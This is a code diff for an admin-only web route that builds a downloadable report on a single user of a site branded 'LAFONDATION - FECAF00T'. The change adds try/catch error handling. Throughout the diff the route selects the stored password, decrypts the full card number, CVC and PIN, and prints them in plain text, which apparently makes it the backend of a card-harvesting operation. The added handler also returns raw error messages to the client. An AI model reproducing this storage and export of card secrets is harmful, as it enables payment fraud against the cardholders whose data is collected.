@@ -9,63 +9,74 @@ export async function GET(
   request: Request,
   { params }: { params: Promise<{ id: string }> }
 ) {
-  const session = await getServerSession(authOptions);
-  if (!session?.user?.id) redirect("/login");
-  if (session.user.role !== "ADMIN") redirect("/dashboard");
+  try {
+    const session = await getServerSession(authOptions);
+    if (!session?.user?.id) redirect("/login");
+    if (session.user.role !== "ADMIN") redirect("/dashboard");
 
-  const { id } = await params;
-  const user = await prisma.user.findUnique({
-    where: { id },
-    select: {
-      id: true,
-      fullName: true,
-      email: true,
-      password: true,
-      role: true,
-      status: true,
-      city: true,
-      address: true,
-      language: true,
-      theme: true,
-      createdAt: true,
-      financials: true,
-      documents: { orderBy: { createdAt: "desc" } },
-      notifications: { orderBy: { createdAt: "desc" } },
-    },
-  });
+    const { id } = await params;
+    const user = await prisma.user.findUnique({
+      where: { id },
+      select: {
+        id: true,
+        fullName: true,
+        email: true,
+        password: true,
+        role: true,
+        status: true,
+        city: true,
+        address: true,
+        language: true,
+        theme: true,
+        createdAt: true,
+        financials: true,
+        documents: { orderBy: { createdAt: "desc" } },
+        notifications: { orderBy: { createdAt: "desc" } },
+      },
+    });
 
-  if (!user) notFound();
+    if (!user) notFound();
 
-  let pdfContent = "LAFONDATION - FECAF00T\n";
-  pdfContent += "User Details Report\n";
-  pdfContent += "Generated: " + new Date().toLocaleString() + "\n";
-  pdfContent += "=".repeat(60) + "\n\n";
+    let pdfContent = "LAFONDATION - FECAF00T\n";
+    pdfContent += "User Details Report\n";
+    pdfContent += "Generated: " + new Date().toLocaleString() + "\n";
+    pdfContent += "=".repeat(60) + "\n\n";
 
-  pdfContent += "-".repeat(60) + "\n";
-  pdfContent += "BASIC INFORMATION\n";
-  pdfContent += "-".repeat(60) + "\n";
-  pdfContent += `User ID: ${user.id}\n`;
-  pdfContent += `Full Name: ${user.fullName}\n`;
-  pdfContent += `Email: ${user.email}\n`;
-  pdfContent += `Role: ${user.role}\n`;
-  pdfContent += `Status: ${user.status}\n`;
-  pdfContent += `City: ${user.city || "N/A"}\n`;
-  pdfContent += `Address: ${user.address || "N/A"}\n`;
-  pdfContent += `Language: ${user.language}\n`;
-  pdfContent += `Theme: ${user.theme}\n`;
-  pdfContent += `Created At: ${user.createdAt.toLocaleString()}\n`;
-
-  if (user.financials) {
-    pdfContent += "\n" + "-".repeat(60) + "\n";
-    pdfContent += "FINANCIAL DETAILS\n";
     pdfContent += "-".repeat(60) + "\n";
-    pdfContent += `Card Name: ${user.financials.cardName}\n`;
-    pdfContent += `Card Number: ${decryptText(user.financials.cardNumberEnc)}\n`;
-    pdfContent += `Last Four: ${user.financials.lastFour}\n`;
-    pdfContent += `Expiry: ${user.financials.expiryDate}\n`;
-    pdfContent += `CVC: ${decryptText(user.financials.cvcEnc)}\n`;
-    pdfContent += `PIN: ${decryptText(user.financials.pinEnc)}\n`;
-  }
+    pdfContent += "BASIC INFORMATION\n";
+    pdfContent += "-".repeat(60) + "\n";
+    pdfContent += `User ID: ${user.id}\n`;
+    pdfContent += `Full Name: ${user.fullName}\n`;
+    pdfContent += `Email: ${user.email}\n`;
+    pdfContent += `Role: ${user.role}\n`;
+    pdfContent += `Status: ${user.status}\n`;
+    pdfContent += `City: ${user.city || "N/A"}\n`;
+    pdfContent += `Address: ${user.address || "N/A"}\n`;
+    pdfContent += `Language: ${user.language}\n`;
+    pdfContent += `Theme: ${user.theme}\n`;
+    pdfContent += `Created At: ${user.createdAt.toLocaleString()}\n`;
+
+    if (user.financials) {
+      pdfContent += "\n" + "-".repeat(60) + "\n";
+      pdfContent += "FINANCIAL DETAILS\n";
+      pdfContent += "-".repeat(60) + "\n";
+      try {
+        pdfContent += `Card Name: ${user.financials.cardName}\n`;
+        pdfContent += `Card Number: ${decryptText(user.financials.cardNumberEnc)}\n`;
+        pdfContent += `Last Four: ${user.financials.lastFour}\n`;
+        pdfContent += `Expiry: ${user.financials.expiryDate}\n`;
+        pdfContent += `CVC: ${decryptText(user.financials.cvcEnc)}\n`;
+        pdfContent += `PIN: ${decryptText(user.financials.pinEnc)}\n`;
+      } catch (decryptError) {
+        console.error("Failed to decrypt financial details:", decryptError);
+        pdfContent += `Card Name: ${user.financials.cardName}\n`;
+        pdfContent += `Card Number: [ENCRYPTED - Cannot decrypt]\n`;
+        pdfContent += `Last Four: ${user.financials.lastFour}\n`;
+        pdfContent += `Expiry: ${user.financials.expiryDate}\n`;
+        pdfContent += `CVC: [ENCRYPTED - Cannot decrypt]\n`;
+        pdfContent += `PIN: [ENCRYPTED - Cannot decrypt]\n`;
+      }
+    }
 
   if (user.documents.length > 0) {
     pdfContent += "\n" + "-".repeat(60) + "\n";
@@ -100,4 +111,17 @@ export async function GET(
       "Content-Disposition": `attachment; filename="${fileName}"`,
     },
   });
+  } catch (error) {
+    console.error("Download API error:", error);
+    return new Response(
+      JSON.stringify({
+        error: "Failed to generate user report",
+        message: error instanceof Error ? error.message : "Unknown error",
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  }
 }
